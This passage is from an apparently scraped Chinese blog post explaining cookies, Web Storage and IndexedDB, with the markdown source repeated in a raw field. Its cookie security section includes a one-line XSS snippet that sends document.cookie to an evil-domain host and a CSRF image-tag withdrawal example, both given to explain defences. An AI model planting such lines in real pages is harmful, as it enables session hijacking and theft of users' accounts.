IDBTransaction 对象\n  数据记录的读写和删改，都要通过事务完成。事务对象提供 error、abort 和 complete 三个事件，用来监听操作结果。\n- 操作请求：IDBRequest 对象\n- 指针： IDBCursor 对象\n- 主键集合：IDBKeyRange 对象\n\n## 3.IndexedDB 的常见操作\n\n在 IndexedDB 大部分操作并不是我们常用的调用方法，返回结果的模式，而是请求——响应的模式。\n建立打开 IndexedDB ---- **window.indexedDB.open(\"testDB\")**\n\n操作流程：\n\n#### 3.1.打开数据库\n\n使用 IndexedDB 的第一步是打开数据库，使用 indexedDB.open()方法。\n\n**window.indexedDB.open(databaseName, version)**\n这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为 1。\n\n```\nvar request = window.indexedDB.open(\"testDB\", version);\n```\n\nindexedDB.open()方法返回一个 IDBOpenDBRequest 对象。这个对象通过三种事件 error、success、upgradeneeded，处理打开数据库的操作结果。\n\n![indexDB](关于浏览器存储/indexDB.png)\n\n这条指令并不会返回一个 DB 对象的句柄，我们得到的是一个 **IDBOpenDBRequest 对象**，而我们希望得到的 DB 对象在其 result 属性中\n\n除了 result，IDBOpenDBRequest 接口定义了几个重要属性:\n\nonerror: 请求失败的回调函数句柄\n\nonsuccess:请求成功的回调函数句柄\n\nonupgradeneeded:请求数据库版本变化句柄\n\n- error 事件表示打开数据库失败。\n\n```\nrequest.onerror = function (event) {\n  console.log('数据库打开报错');\n};\n```\n\n- success 事件表示成功打开数据库。\n\n```\nvar db;\nrequest.onsuccess = function (event) {\n  db = request.result;\n  console.log('数据库打开成功');\n};\n```\n\n这时，通过 request 对象的 result 属性拿到数据库对象。\n\n- upgradeneeded 事件\n\n如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件 upgradeneeded。\n\n```\nvar db;\nrequest.onupgradeneeded = function (event) {\n  db = event.target.result;\n}\n```\n\n这时通过事件对象的 target.result 属性，拿到数据库实例。\n\n#### 3.2.新建数据库\n\n**createObjectStore**\n新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在 upgradeneeded 事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。\n\n通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。\n\n```\nrequest.onupgradeneeded = function(event) {\n  db = event.target.result;\n  var objectStore = db.createObjectStore('person', { keyPath: 'id' });\n}\n```\n\n上面代码中，数据库新建成功以后，新增一张叫做 person 的表格，主键是 id。\n更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。\n\n```\nrequest.onupgradeneeded = function (event) {\n  db = event.target.result;\n  var objectStore;\n  if (!db.objectStoreNames.contains('person')) {\n    objectStore = db.createObjectStore('person', { keyPath: 'id' });\n  }\n}\n```\n\n主键（key）是默认建立索引的属性。比如，数据记录是{ id: 1, name: '张三' }，那么 id 属性可以作为主键。主键也可以指定为下一层对象的属性，比如{ foo: { bar: 'baz' } }的 foo.bar 也可以指定为主键。\n\n如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。\n\n```\nvar objectStore = db.createObjectStore(\n  'person',\n  { autoIncrement: true }\n);\n```\n\n上面代码中，指定主键为一个递增的整数。\n\n新建对象仓库以后，下一步可以新建索引。\n\n```\nrequest.onupgradeneeded = function(event) {\n  db = event.target.result;\n  var objectStore = db.createObjectStore('person', { keyPath: 'id' });\n  objectStore.createIndex('name', 'name', { unique: false });\n  objectStore.createIndex('email', 'email', { unique: true });\n}\n```\n\n上面代码中，**IDBObject.createIndex()**的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。\n\n#### 3.3.新增数据\n\n新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。\n\n```\nfunction add() {\n  var request = db.transaction(['person'], 'readwrite')\n    .objectStore('person')\n    .add({ id: 1, name: '张三', age: 24, email: 'zhangsan@example.com' });\n\n  request.onsuccess = function (event) {\n    console.log('数据写入成功');\n  };\n\n  request.onerror = function (event) {\n    console.log('数据写入失败');\n  }\n}\n\nadd();\n```\n\n上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（\"只读\"或\"读写\"）。新建事务以后，通过 **IDBTransaction.objectStore(name)**方法，拿到 IDBObjectStore 对象，再通过表格对象的 add()方法，向表格写入一条记录。\n\n写入操作是一个异步操作，通过监听连接对象的 success 事件和 error 事件，了解是否写入成功。\n\n#### 3.4.读取数据\n\n读取数据也是通过事务完成。\n\n```\nfunction read() {\n   var transaction = db.transaction(['person']);\n   var objectStore = transaction.objectStore('person');\n   var request = objectStore.get(1);\n\n   request.onerror = function(event) {\n     console.log('事务失败');\n   };\n\n   request.onsuccess = function( event) {\n      if (request.result) {\n        console.log('Name: ' + request.result.name);\n        console.log('Age: ' + request.result.age);\n        console.log('Email: ' + request.result.email);\n      } else {\n        console.log('未获得数据记录');\n      }\n   };\n}\n\nread();\n```\n\n上面代码中，**objectStore.get()**方法用于读取数据，参数是主键的值。\n\n#### 3.5.遍历数据\n\n遍历数据表格的所有记录，要使用指针对象 IDBCursor。\n\n```\nfunction readAll() {\n  var objectStore = db.transaction('person').objectStore('person');\n\n   objectStore.openCursor().onsuccess = function (event) {\n     var cursor = event.target.result;\n\n     if (cursor) {\n       console.log('Id: ' + cursor.key);\n       console.log('Name: ' + cursor.value.name);\n       console.log('Age: ' + cursor.value.age);\n       console.log('Email: ' + cursor.value.email);\n       cursor.continue();\n    } else {\n      console.log('没有更多数据了！');\n    }\n  };\n}\n\nreadAll();\n```\n\n上面代码中，新建指针对象的**openCursor()方法**是一个异步操作，所以要监听 success 事件。\n\n#### 3.6.更新数据\n\n更新数据要使用**IDBObject.put()方法**。\n\n```\nfunction update() {\n  var request = db.transaction(['person'], 'readwrite')\n    .objectStore('person')\n    .put({ id: 1, name: '李四', age: 35, email: 'lisi@example.com' });\n\n  request.onsuccess = function (event) {\n    console.log('数据更新成功');\n  };\n\n  request.onerror = function (event) {\n    console.log('数据更新失败');\n  }\n}\n\nupdate();\n```\n\n上面代码中，put()方法自动更新了主键为 1 的记录。\n\n#### 3.7.删除数据\n\n**IDBObjectStore.delete()方法**用于删除记录。\n\n```\nfunction remove() {\n  var request = db.transaction(['person'], 'readwrite')\n    .objectStore('person')\n    .delete(1);\n\n  request.onsuccess = function (event) {\n    console.log('数据删除成功');\n  };\n}\n\nremove();\n```\n\n#### 3.8.使用索引\n\n索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。\n\n假定新建表格的时候，对 name 字段建立了索引。\n\n```\nobjectStore.createIndex('name', 'name', { unique: false });\n```\n\n现在，就可以从 name 找到对应的数据记录了。\n\n```\nvar transaction = db.transaction(['person'], 'readonly');\nvar store = transaction.objectStore('person');\nvar index = store.index('name');\nvar request = index.get('李四');\n\nrequest.onsuccess = function (e) {\n  var result = e.target.result;\n  if (result) {\n    // ...\n  } else {\n    // ...\n  }\n}\n```\n\n### 关闭 IndexDB\n\n**indexdb.close()**\n\n## 3.WebStorage、cookie 和 IndexedDB 之间的区别\n\n| 特性         | cookie                                       | localstorage             | sessionstorage | indexDB                  |\n| ------------ | :------------------------------------------- | :----------------------- | :------------- | :----------------------- |\n| 数据生命周期 | 一般有服务器生成，可以设置过期时间           | 除非被清除，否则一直存在 | 页面关闭就清理 | 除非被清除，否则一直存在 |\n| 数据存储大小 | 4K                                           | 5M                       | 5M             | 无限                     |\n| 与服务端通信 | 每次都会携带在 header 里，对于性能有很大影响 | 不参与                   | 不参与         | 不参与                   |\n\n从上表可以看到，cookie 已经不建议用于存储。如果没有大量数据存储需求的话，可以使用 localStorage 和 sessionStorage 。对于不怎么改变的数据尽量使用 localStorage 存储，否则可以用 sessionStorage 存储。\n\n# 小结\n\n正是浏览器存储、缓存技术的出现和发展，为我们的前端应用带来了无限的转机。近年来基于存储、缓存技术的第三方库层出不绝，此外还衍生出了 PWA 这样优秀的 Web 应用模型。总结下本文几个核心观点：\n\n- Cookie 的本职工作并非本地存储，而是“维持状态”\n- Web Storage 是 HTML5 专门为浏览器存储而提供的数据存储机制，不与服务端发生通信\n- IndexedDB 用于客户端存储大量结构化数据\n","source":"_posts/关于浏览器存储.md","raw":"---\ntitle: 关于浏览器存储\ndate: 2019-04-08 09:42:43\ntags:\n  - 笔记\n  - JavaScript\n---\n\n# 浏览器存储有哪些？\n\n- Cookie\n- LocalStorage\n- SessionStorage\n- IndexDB\n\n# Cookie\n\n### 1.Cookie 的来源\n\n**Cookie 的本职工作并非本地存储，而是“维持状态”。**\n因为 **HTTP 协议是无状态的，HTTP 协议自身不对请求和响应之间的通信状态进行保存**，通俗来说，服务器不知道用户上一次做了什么，这严重阻碍了交互式 Web 应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于 HTTP 的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，于是就诞生了 Cookie。它就是用来绕开 HTTP 的无状态性的“额外手段”之一。服务器可以设置或读取 Cookies 中包含信息，借此维护用户跟服务器会话中的状态。\n\n我们可以把 Cookie 理解为一个存储在浏览器里的一个小小的文本文件，它附着在 HTTP 请求上，在浏览器和服务器之间“飞来飞去”。它可以携带用户信息，当服务器检查 Cookie 的时候，便可以获取到客户端的状态。\n\n在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段 Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把 Cookie 发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段 Cookie 里追加新的商品信息。结帐时，服务器读取发送来的 Cookie 就行了。\n\n### 2.什么是 Cookie 以及应用场景\n\nHTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。\nCookie 是一个请求首部，其中含有先前由服务器通过 Set-Cookie 首部投放并存储到客户端的 HTTP cookies。\n**Cookie 指某些网站为了辨别用户身份而储存在用户本地终端上的数据(通常经过加密)。 cookie 是服务端生成，客户端进行维护和存储**。通过 cookie,可以让服务器知道请求是来源哪个客户端，就可以进行客户端状态的维护，比如登陆后刷新，请求头就会携带登陆时 response header 中的 set-cookie,Web 服务器接到请求时也能读出 cookie 的值，根据 cookie 值的内容就可以判断和恢复一些用户的信息状态。\n\n  <!-- 典型的应用场景有：\n\n  - 记住密码，下次自动登录。\n  - 购物车功能。\n  - 记录用户浏览数据，进行商品（广告）推荐。 -->\n\nCookie 主要用于以下三个方面：\n\n- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）\n- 个性化设置（如用户自定义设置、主题等）\n- 浏览器行为跟踪（如跟踪分析用户行为等）\n\n### 3.Cookie 的原理以及如何生成\n\n第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个 Set-Cookie 选项，将 cookie 放入到响应请求中，在浏览器第二次发请求的时候，会通过 Cookie 请求头部将 Cookie 信息发送给服务器，服务端会辨别用户身份，另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。\n\nCookie 的生成方式主要有两种：\n\n- 生成方式一：http response header 中的 set-cookie\n\n我们可以通过响应头里的 Set-Cookie 指定要存储的 Cookie 值。默认情况下，domain 被设置为设置 Cookie 页面的主机名，我们也可以手动设置 domain 的值。\n服务器通过该头部告知客户端保存 Cookie 信息。\n\n```\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n[页面内容]\n\n```\n\n现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 Cookie 请求头部再发送给服务器。\n\n```\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n\n```\n\n##### 会话期 Cookie\n\n会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样。\n\n##### 持久性 Cookie\n\n和关闭浏览器便失效的会话期 Cookie 不同，持久性 Cookie 可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。\n\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n```\n\n**Tips:** 当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。\n\n#### Cookie 的 Secure 和 HttpOnly 标记\n\nHttpOnly 不支持读写，浏览器不允许脚本操作 document.cookie 去更改 cookie， 所以为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 Document.cookie API 无法访问带有 HttpOnly 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。\n\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n```\n\n标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用 Cookie 的 Secure 标记。\n\n- 生成方式二：js 中可以通过 document.cookie 可以读写 cookie，以键值对的形式展示\n\n例如我们在百度首页控制台输入以下三句代码，便可以在 Chrome 的 Application 面板查看生成的 cookie:\n\n```\ndocument.cookie=\"name=hello\";\ndocument.cookie=\"age=18\";\ndocument.cookie=\"domain=google.com;gender=male\"\n```\n\n![code](关于浏览器存储/code.png)\n查看结果\n![cookie](关于浏览器存储/cookie.png)\n\n从上图中我们可以得出：\n\n##### Cookie 的作用域\n\nDomain 和 Path 标识定义了 Cookie 的作用域：即 Cookie 应该发送给哪些 URL。\nDomain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。\n\n**Domain 标识指定了哪些域名可以接受 Cookie。如果没有设置 domain，就会自动绑定到执行语句的当前域**。 如果设置为”.google.com”,则所有以”google.com”结尾的域名都可以访问该 Cookie，所以在百度首页上读取不到第三条代码存储 Cookie 值。\n\n当将域名设置为当前执行语句的域名时，就可以看见该条记录\n![code1](关于浏览器存储/code.png)\n查看结果\n![cookie1](关于浏览器存储/cookie.png)\n\n### 4.Cookie 的缺陷\n\n- Cookie 不够大\n  Cookie 的大小限制在 4KB 左右，对于复杂的存储需求来说是不够用的。当 Cookie 超过 4KB 时，它将面临被裁切的命运。这样看来，Cookie 只能用来存取少量的信息。此外很多浏览器对一个站点的 cookie 个数也是有限制的。\n  这里需注意：各浏览器的 cookie **每一个 name=value 的 value 值大概在 4k**，所以 4k 并不是一个域名下所有的 cookie 共享的,而是一个 name 的大小。\n\n- 过多的 Cookie 会带来巨大的性能浪费\n  Cookie 是紧跟域名的。**同一个域名下的所有请求，都会携带 Cookie**。大家试想，如果我们此刻仅仅是请求一张图片或者一个 CSS 文件，我们也要携带一个 Cookie 跑来跑去（关键是 Cookie 里存储的信息并不需要），这是一件多么劳民伤财的事情。Cookie 虽然小，请求却可以有很多，随着请求的叠加，这样的不必要的 Cookie 带来的开销将是无法想象的。\n  cookie 是用来维护用户信息的，而域名(domain)下所有请求都会携带 cookie，但对于静态文件的请求，携带 cookie 信息根本没有用，此时可以通过 cdn（存储静态文件的）的域名和主站的域名分开来解决。\n\n- 安全问题\n  由于在 HTTP 请求中的 Cookie 是明文传递的，所以安全性成问题，除非用 HTTPS。\n\n### 5.Cookie 与安全\n\n**tips:** 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息\n\n- 会话劫持和跨站脚本攻击（XSS）\n  在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击。\n\n```\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n- 跨站请求伪造（CSRF）\n  比如在不安全聊天室或论坛上的一张图片，当你访问这张图片，它实际上是一个给你银行服务器发送提现的请求：\n  当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。\n\n```\n<img src=\"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory\">\n```\n\n有一些方法可以阻止此类事件的发生：\n\n- 对用户输入进行过滤来阻止 XSS；\n- 任何敏感操作都需要确认；\n- 用于敏感信息的 Cookie 只能拥有较短的生命周期；\n\n为了弥补 Cookie 的局限性，让“专业的人做专业的事情”，Web Storage 出现了。\n**HTML5 中新增了本地存储的解决方案----Web Storage，它分成两类：sessionStorage 和 localStorage。**这样有了 WebStorage 后，cookie 能只做它应该做的事情了——作为客户端与服务器交互的通道，保持客户端状态。\n\n# LocalStorage\n\n## 1.LocalStorage 的特点\n\n- 保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。\n- 大小为 5M 左右\n- 仅在客户端使用，不和服务端进行通信\n- 接口封装较好\n\n## 2.存入/读取/删除数据\n\nlocalStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 localStorage.setItem(\"key\",\"value\");读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=localStorage.getItem(\"key\");\n\n- 存入数据\n  **localStorage.setItem(\"key\", \"value\")**\n  该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。\n\n```\n<script>\nif (window.localStorage) {\n  localStorage.setItem(\"name\", \"hello\");\n  localStorage.setItem(\"age\", 18);\n}\n</script>\n```\n\n- 读取数据\n  **localStorage.getItem(\"key\")**\n  该方法接受一个键名作为参数，返回键名对应的值\n  只需要传入 key 即可\n\n```\nvar name = localStorage.getItem(\"name\");\nvar age = localStorage.getItem(\"age\");\nconsole.log(name) // hello\nconsole.log(age) // 18\n```\n\n- 删除数据\n  **localStorage.removeItem(\"key\");**\n  该方法接受一个键名作为参数，并把该键名从存储中删除。\n  只需要传入 key 即可\n\n```\nlocalStorage.removeItem(\"name\");\nlocalStorage.removeItem(\"age\");\n```\n\n- 移除所有\n  **localStorage.clear();**\n  调用该方法会清空存储中的所有键名。\n  不需要传入参数\n\n```\nlocalStorage.clear();\n```\n\n## 3.使用场景\n\nLocalStorage 在存储方面没有什么特别的限制，理论上 Cookie 无法胜任的、可以用简单的键值对来存取的数据存储任务，都可以交给 LocalStorage 来做。\n\n这里给大家举个例子，考虑到 LocalStorage 的特点之一是持久，有时我们更倾向于用它来存储一些内容稳定的资源。比如图片内容丰富的电商网站会用它来存储 Base64 格式的图片字符串：\n\n# SessionStorage\n\nsessionStorage 保存的数据用于浏览器的一次会话，当会话结束（通常是该窗口关闭），数据被清空；sessionStorage 特别的一点在于，即便是相同域名下的两个页面，只要它们不在同一个浏览器窗口中打开，那么它们的 sessionStorage 内容便无法共享；localStorage 在所有同源窗口中都是共享的；cookie 也是在所有同源窗口中都是共享的。除了保存期限的长短不同，SessionStorage 的属性和方法与 LocalStorage 完全一样。\n\n## 1.sessionStorage 的特点\n\n- 会话级别的浏览器存储\n- 大小为 5M 左右\n- 仅在客户端使用，不和服务端进行通信\n- 接口封装较好\n\n## 2.存入/读取/删除数据\n\nsessionStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 sessionStorage.setItem(\"key\",\"value\");读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=sessionStorage.getItem(\"key\");\n\n- 存入数据\n  **sessionStorage.setItem(\"key\", \"value\")**\n  该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。\n\n```\n<script>\nif (window.sessionStorage) {\n  sessionStorage.setItem(\"name\", \"hello\");\n  sessionStorage.setItem(\"age\", 18);\n}\n</script>\n```\n\n- 读取数据\n  **sessionStorage.getItem(\"key\")**\n  该方法接受一个键名作为参数，返回键名对应的值\n  只需要传入 key 即可\n\n```\nvar name = sessionStorage.getItem(\"name\");\nvar age = sessionStorage.getItem(\"age\");\nconsole.log(name) // hello\nconsole.log(age) // 18\n\n```\n\n- 删除数据\n  **sessionStorage.removeItem(\"key\");**\n  该方法接受一个键名作为参数，并把该键名从存储中删除。\n  只需要传入 key 即可\n\n```\nsessionStorage.removeItem(\"name\");\nsessionStorage.removeItem(\"age\");\n```\n\n- 移除所有\n  **sessionStorage.clear();**\n  调用该方法会清空存储中的所有键名。\n  不需要传入参数\n\n```\nsessionStorage.clear();\n```\n\n## 3.使用场景\n\nsessionStorage 更适合用来存储生命周期和它同步的会话级别的信息。这些信息只适用于当前会话，当你开启新的会话时，它也需要相应的更新或释放。比如微博的 sessionStorage 就主要是存储你本次会话的浏览足迹\n\n## **sessionStorage 、localStorage 和 cookie 之间的区别**\n\n- 共同点：都是保存在浏览器端，且都遵循同源策略。\n- 不同点：在于生命周期与作用域的不同\n\n作用域：localStorage 只要在相同的协议、相同的主机名、相同的端口下，就能读取/修改到同一份 localStorage 数据。sessionStorage 比 localStorage 更严苛一点，除了协议、主机名、端口外，还要求在同一窗口（也就是浏览器的标签页）下\n\n生命周期：localStorage 是持久化的本地存储，存储在其中的数据是永远不会过期的，使其消失的唯一办法是手动删除；而 sessionStorage 是临时性的本地存储，它是会话级别的存储，当会话结束（页面被关闭）时，存储内容也随之被释放。\n\nWeb Storage 是一个从定义到使用都非常简单的东西。它使用键值对的形式进行存储，这种模式有点类似于对象，却甚至连对象都不是——它只能存储字符串，要想得到对象，我们还需要先对字符串进行一轮解析。\n\n说到底，Web Storage 是对 Cookie 的拓展，它只能用于存储少量的简单数据。当遇到大规模的、结构复杂的数据时，Web Storage 也爱莫能助了。这时候我们就要清楚我们的终极大 boss——IndexedDB！\n\n# IndexDB\n\n通俗地说，IndexedDB 就是**浏览器提供的本地数据库**，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。\nIndexedDB 是一种低级 API，**用于客户端存储大量结构化数据(包括文件和 blobs)**。该 API 使用索引来实现对该数据的高性能搜索。IndexedDB 是一个运行在浏览器上的非关系型数据库。既然是数据库了，那就不是 5M、10M 这样小打小闹级别了。理论上来说，IndexedDB 是没有存储上限的（一般来说不会小于 250M）。它不仅可以存储字符串，还可以存储二进制数据。\n\n## 1.IndexedDB 的特点\n\n- 键值对储存。\n  IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以\"键值对\"的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。\n\n- 异步\n  IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。\n\n- 支持事务。\n  IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。\n\n- 同源限制\n  IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。\n\n- 储存空间大\n  IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。\n\n- 支持二进制储存。\n  IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。\n\n## 2.基本概念\n\nIndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。\n\n- 数据库：IDBDatabase 对象\n  数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。\n  IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。\n\n- 对象仓库：IDBObjectStore 对象\n  每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。\n- 数据记录\n  对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。\n  ```\n  { id: 1, text: 'foo' }\n  ```\n- 索引： IDBIndex 对象\n  为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。\n- 事务： IDBTransaction 对象\n  数据记录的读写和删改，都要通过事务完成。事务对象提供 error、abort 和 complete 三个事件，用来监听操作结果。\n- 操作请求：IDBRequest 对象\n- 指针： IDBCursor 对象\n- 主键集合：IDBKeyRange 对象\n\n## 3.IndexedDB 的常见操作\n\n在 IndexedDB 大部分操作并不是我们常用的调用方法，返回结果的模式，而是请求——响应的模式。\n建立打开 IndexedDB ---- **window.indexedDB.open(\"testDB\")**\n\n操作流程：\n\n#### 3.1.打开数据库\n\n使用 IndexedDB 的第一步是打开数据库，使用 indexedDB.open()方法。\n\n**window.indexedDB.open(databaseName, version)**\n这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为 1。\n\n```\nvar request = window.indexedDB.open(\"testDB\", version);\n```\n\nindexedDB.open()方法返回一个 IDBOpenDBRequest 对象。这个对象通过三种事件 error、success、upgradeneeded，处理打开数据库的操作结果。\n\n![indexDB](关于浏览器存储/indexDB.png)\n\n这条指令并不会返回一个 DB 对象的句柄，我们得到的是一个 **IDBOpenDBRequest 对象**，而我们希望得到的 DB 对象在其 result 属性中\n\n除了 result，IDBOpenDBRequest 接口定义了几个重要属性:\n\nonerror: 请求失败的回调函数句柄\n\nonsuccess:请求成功的回调函数句柄\n\nonupgradeneeded:请求数据库版本变化句柄\n\n- error 事件表示打开数据库失败。\n\n```\nrequest.onerror = function (event) {\n  console.log('数据库打开报错');\n};\n```\n\n- success 事件表示成功打开数据库。\n\n```\nvar db;\nrequest.onsuccess = function (event) {\n  db = request.result;\n  console.log('数据库打开成功');\n};\n```\n\n这时，通过 request 对象的 result 属性拿到数据库对象。\n\n- upgradeneeded 事件\n\n如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件 upgradeneeded。\n\n```\nvar db;\nrequest.onupgradeneeded = function (event) {\n  db = event.target.result;\n}\n```\n\n这时通过事件对象的 target.result 属性，拿到数据库实例。\n\n#### 3.2.新建数据库\n\n**createObjectStore**\n新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在 upgradeneeded 事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。\n\n通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。\n\n```\nrequest.onupgradeneeded = function(event) {\n  db = event.target.result;\n  var objectStore = db.createObjectStore('person', { keyPath: 'id' });\n}\n```\n\n上面代码中，数据库新建成功以后，新增一张叫做 person 的表格，主键是 id。\n更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。\n\n```\nrequest.onupgradeneeded = function (event) {\n  db = event.target.result;\n  var objectStore;\n  if (!db.objectStoreNames.contains('person')) {\n    objectStore = db.createObjectStore('person', { keyPath: 'id' });\n  }\n}\n```\n\n主键（key）是默认建立索引的属性。比如，数据记录是{ id: 1, name: '张三' }，那么 id 属性可以作为主键。主键也可以指定为下一层对象的属性，比如{ foo: { bar: 'baz' } }的 foo.bar 也可以指定为主键。\n\n如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。\n\n```\nvar objectStore = db.createObjectStore(\n  'person',\n  { autoIncrement: true }\n);\n```\n\n上面代码中，指定主键为一个递增的整数。\n\n新建对象仓库以后，下一步可以新建索引。\n\n```\nrequest.onupgradeneeded = function(event) {\n  db = event.target.result;\n  var objectStore = db.createObjectStore('person', { keyPath: 'id' });\n  objectStore.createIndex('name', 'name', { unique: false });\n  objectStore.createIndex('email', 'email', { unique: true });\n}\n```\n\n上面代码中，**IDBObject.createIndex()**的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。\n\n#### 3.3.新增数据\n\n新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。\n\n```\nfunction add() {\n  var request = db.transaction(['person'], 'readwrite')\n    .objectStore('person')\n    .add({ id: 1, name: '张三', age: 24, email: 'zhangsan@example.com' });\n\n  request.onsuccess = function (event) {\n    console.log('数据写入成功');\n  };\n\n  request.onerror = function (event) {\n    console.log('数据写入失败');\n  }\n}\n\nadd();\n```\n\n上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（\"只读\"或\"读写\"）。新建事务以后，通过 **IDBTransaction.objectStore(name)**方法，拿到 IDBObjectStore 对象，再通过表格对象的 add()方法，向表格写入一条记录。\n\n写入操作是一个异步操作，通过监听连接对象的 success 事件和 error 